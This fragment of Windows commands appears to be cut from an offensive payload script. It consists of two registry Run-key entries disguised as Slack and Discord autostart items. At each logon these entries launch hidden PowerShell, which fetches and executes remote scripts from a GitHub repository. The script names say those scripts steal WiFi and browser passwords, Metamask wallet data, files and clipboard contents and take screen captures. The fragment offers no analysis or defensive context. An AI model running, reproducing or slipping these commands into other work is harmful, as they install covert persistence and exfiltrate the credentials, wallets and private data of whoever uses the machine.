...
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /f /v slack.electron.app /t REG_SZ /d "conhost --headless powershell.exe -Command \`"irm https://raw.githubusercontent.com/WesleyWong420/OPSEC-Tradecraft/refs/heads/main/O.MG%20Payloads/WiFi_Browser_Passwords_Metamask_FilesExfil_ClipboardData.ps1 | iex\`"" > $null
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /f /v discord.electron.app /t REG_SZ /d "conhost --headless powershell.exe -Command \`"irm https://raw.githubusercontent.com/WesleyWong420/OPSEC-Tradecraft/refs/heads/main/O.MG%20Payloads/Wallpaper_ScreenCapture.ps1 | iex\`"" > $null
